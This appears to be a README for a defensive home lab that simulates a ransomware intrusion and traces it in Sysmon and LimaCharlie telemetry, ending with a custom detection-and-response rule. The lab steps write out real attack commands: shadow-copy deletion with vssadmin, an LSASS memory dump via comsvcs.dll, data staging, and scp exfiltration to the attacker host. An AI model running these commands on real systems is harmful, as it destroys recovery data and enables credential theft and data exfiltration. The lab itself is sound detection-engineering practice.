# 🛡️ Windows Telemetry Hardening & Enterprise Threat Hunting Lab

An end-to-end blue team simulation replicating a multi-stage intrusion lifecycle (Ransomware Inhibition, Advanced Credential Access, Double-Extortion Data Staging, Exfiltration, and Cryptographic Impact). This lab tracks the generation of endpoint events via Microsoft Sysmon and processes real-time telemetry pipelines inside the cloud-native LimaCharlie EDR/SIEM platform, culminating in active Detection Engineering automation.

---

## 📊 Quick Links & Deliverables
*   **Project Presentation Link:** [👉 Click Here to View the Google Slides Presentation](PASTE_YOUR_GOOGLE_SLIDES_SHARE_LINK_HERE)
*   **Target Machine Architecture:** Windows 10 Home (Hardened Endpoint Sensor Node)
*   **Attack Infrastructure:** Kali Linux via Private Hypervisor Network Bridge (`192.168.10.0/24`)
*   **EDR Control Plane:** LimaCharlie Cloud-Native Security Operations Interface

---

## 🏗️ 1. Architecture & Lab Environment Baseline

This environment mirrors a corporate perimeter intrusion zone where an external adversary bridges network boundaries to establish a command-and-control footprint on a local asset.

### Infrastructure Blueprint
*   **Attacker Node (Kali Linux):** Positioned on private virtual subnet segment `192.168.10.250`.
*   **Target Endpoint (Windows 10):** Positioned at static local node `192.168.10.9`. 
*   **Telemetry Forwarder (Microsoft Sysmon):** Deployed locally to capture advanced event arrays (Process Creation, Network Connections, File Integrity Events, Process Access Memory Handles).
*   **SIEM Engine (LimaCharlie EDR):** Deployed via an active host sensor configuration, facilitating live detection parsing and real-time automated telemetry analytics streams.

---

## 🛑 2. Intrusion Simulation & Forensic Timeline Analysis

### Use Case 1: Inhibit System Recovery (Ransomware Pre-Cursor)
*   **MITRE ATT&CK Mapping:** T1490 — Inhibit System Recovery
*   **Attacker Action:** Threat actor accessed the target environment remotely via an OpenSSH tunnel profile on Port 22 and executed a destructive deletion loop to render system rollbacks impossible:
    ```cmd
    vssadmin delete shadows /all /quiet
    ```
*   **SIEM Forensic Footprint:** Reflected in LimaCharlie as a high-severity `PROCESS_CREATION` log event highlighting `C:\Windows\System32\vssadmin.exe` passing explicit arguments under the root lineage parent index of `sshd.exe`.

### Use Case 2: High-Privilege Credential Access (LSASS Memory Dump)
*   **MITRE ATT&CK Mapping:** T1003.001 — OS Credential Dumping: LSASS Memory
*   **Attacker Action:** Utilizing native Living-off-the-Land binary techniques to evade graphical alerts, a memory snapshot sequence was initialized to clone security subsystem passwords to disk:
    ```cmd
    powershell.exe -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 604 C:\Users\Target-PC2\Documents\lsass.dmp full"
    ```
*   **SIEM Forensic Footprint:** Detected inside the LimaCharlie Live Feed and Timeline structures via a high-integrity process access mechanism. Telemetry highlights an elevated execution profile (`IntegrityLevel: High`) bridging process thresholds directly into the protected space of `lsass.exe`.

### Use Case 3: Double-Extortion Collection & Data Staging
*   **MITRE ATT&CK Mapping:** T1074.001 — Data Staging: Local Data Staging
*   **Attacker Action:** Sensitive corporate tables and PII documents were staged and archived inside a temporary directory container before active theft protocols were initiated:
    ```cmd
    powershell Compress-Archive -Path C:\CorporateData -DestinationPath C:\Windows\Temp\sensitive_exfil.zip -Force
    ```
*   **SIEM Forensic Footprint:** Captured as a **Sysmon Event ID 11 (File Creation Event)**, registering an active target file write signature for `sensitive_exfil.zip` inside the restricted `C:\Windows\Temp\` partition path space.

### Use Case 4: Data Exfiltration over Secure Tunnels
*   **MITRE ATT&CK Mapping:** T1048 — Exfiltration Over Alternative Protocol
*   **Attacker Action:** Staged archive files were exfiltrated back out of the victim ecosystem using native Secure Copy utilities from the attacker's terminal grid framework:
    ```bash
    scp Target-PC2@192.168.10.9:../../Windows/Temp/sensitive_exfil.zip ~/Desktop/
    ```
*   **SIEM Forensic Footprint:** Tracked down natively via an active **Sysmon Event ID 3 (Network Connection)**. Evaluated records prove the target outbound network spike originated from `sshd.exe` channeling active content data blocks toward external address space `192.168.10.250`.

### Use Case 5: Action on Objectives (Cryptographic Ransomware Impact)
*   **MITRE ATT&CK Mapping:** T1486 — Data Encrypted for Impact
*   **Attacker Action:** Initialised a cryptographic script loop to destroy the file visibility of local corporate databases, altering file extensions to `.locked` while generating a persistent extortion note:
    ```txt
    READ_ME_RANSOM.txt -> "YOUR FILES HAVE BEEN ENCRYPTED! Pay 1 BTC..."
    ```
*   **SIEM Forensic Footprint:** Identified as an active automated write wave, popping an Event ID 11 indicator in Sysmon as the text file reached the user's desktop profile directory zone.

---

## 🛠️ 3. Proactive Detection Engineering & Automated Defense

To transition from passive alert auditing to active automated response mitigations, a custom Detection and Response (D&R) rule profile was engineered and deployed into production inside the cloud control plane.

### Rule Profile Identification: `Ransom_Note_Mitigation_Rule`

#### Detection Logic (YAML Parameters):
```yaml
event: FILE_CREATE
op: matches
path: event/FILE_PATH
re: .*\\Desktop\\.*RANSOM.*\.txt\$
```

#### Automated Containment Response Actions (YAML Parameters):
```yaml
- action: report
  name: CRITICAL_RANSOMWARE_DETONATION_ATTEMPT
- action: task
  command: history_dump
- action: task
  command: deny_tree <<routing/parent>>
```

### Engineering Remediation Summary
The rule provides microsecond containment properties. The moment an active file generation thread attempts to append a file string containing the malicious structural regex parameters onto the desktop space, the engine catches the telemetry block. It automatically flags a critical console response notification, dumps volatile log architecture history for later forensics, and initiates an immediate **`deny_tree` process kill command** targeting the parental root pipeline thread running the script. This drops the Mean Time to Remediate (MTTR) straight down to the millisecond scale, neutralizing the attack thread completely before any further encryption loops can expand across the server disk.
